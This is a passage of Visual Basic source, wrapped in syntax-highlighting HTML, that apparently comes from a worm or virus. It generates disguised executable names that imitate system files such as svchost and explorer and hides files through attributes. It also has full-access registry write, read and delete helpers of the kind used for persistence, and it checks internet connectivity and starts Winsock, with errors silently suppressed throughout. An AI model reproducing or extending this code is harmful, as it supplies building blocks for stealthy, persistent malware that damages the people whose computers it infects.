</span><span class="sc4">"serv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"clip"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dos"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"free"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"micro"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"grp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"hw"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"ip"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"is"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"net"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"xp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"w2k"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">bod</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"command"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"load"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"rundl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"setup"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"install"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"calc"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"defrag"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"aplog"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"cln"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"player"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"explorer"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"wiek"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"zq"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ftp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"groups"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"mixer"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Uninst"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"route"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"svchost"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"twtour"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">suf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"upd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"stat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"arp"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"38"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"map"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"brd"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"rep"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"drv"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"386"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"info"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"040a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"img"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"503"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
</span><span class="sc4">"mon"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"set"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"lib"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"dll"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"unst"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">est</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">".exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".com"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".pif"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".bat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">Randomize</span><span class="sc0">
</span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">RndName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">UCase</span><span class="sc6">(</span><span class="sc7">pre</span><span class="sc6">(</span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">bod</span><span class="sc6">(</span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">suf</span><span class="sc6">(</span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">est</span><span class="sc6">(</span><span class="sc7">RI</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)))</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SA</span><span class="sc6">(</span><span class="sc7">P</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">SetAttr</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Rw</span><span class="sc6">(</span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">m0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">m1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">m0</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CLASSES_ROOT</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_LOCAL_MACHINE</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCreateKeyEx</span><span class="sc6">(</span><span class="sc7">RK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">REG_OPTION_NON_VOLATILE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">KEY_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">m1</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sVal</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
 </span><span class="sc7">sVal</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vKey</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegSetValueEx</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sVal</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sVal</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lVal</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">lVal</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vKey</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegSetValueEx</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">REG_DWORD</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lVal</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sVale</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
 </span><span class="sc7">sVale</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vKey</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegSetValueEx</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">REG_EXPAND_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sVale</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">sVale</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Rd</span><span class="sc6">(</span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CLASSES_ROOT</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_LOCAL_MACHINE</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegOpenKeyEx</span><span class="sc6">(</span><span class="sc7">RK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">KEY_ALL_ACCESS</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegDeleteValue</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ky</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">m</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CLASSES_ROOT</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_CURRENT_USER</span><span class="sc0">
</span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">RK</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">HKEY_LOCAL_MACHINE</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegOpenKeyEx</span><span class="sc6">(</span><span class="sc7">RK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">KEY_QUERY_VALUE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hKey</span><span class="sc6">)</span><span class="sc0">

  </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegQueryValueEx</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">ky</span><span class="sc6">)</span><span class="sc0">
  
</span><span class="sc7">fKey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">(</span><span class="sc7">ky</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">))</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">&lt;=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

  </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegQueryValueEx</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc7">REG_SZ</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">fKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ky</span><span class="sc6">)</span><span class="sc0">
  
</span><span class="sc7">fKey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">fKey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ky</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RegCloseKey</span><span class="sc6">(</span><span class="sc7">hKey</span><span class="sc6">)</span><span class="sc0">
  
</span><span class="sc7">Rr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fKey</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">WIni</span><span class="sc6">(</span><span class="sc7">I_S</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IK</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IV</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ip</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Wn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">Wn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WritePrivateProfileString</span><span class="sc6">(</span><span class="sc7">I_S</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IK</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IV</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ip</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'OK
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FrFile</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">FrFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">iStat</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">iStat</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">InternetGetConnectedState</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">&amp;,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">StartWinsock</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc0">
</span><span class="sc7">StartWinsock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IIf</span><span class="sc6">(</span><span class="sc7">WSAStartup</span><span class="sc6">(</span><span class="sc2">&amp;H101</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">StartupData</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">WSAIsBlocking</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSACancelBlockingCall</span><span class="sc6">()</span><span class="sc0">
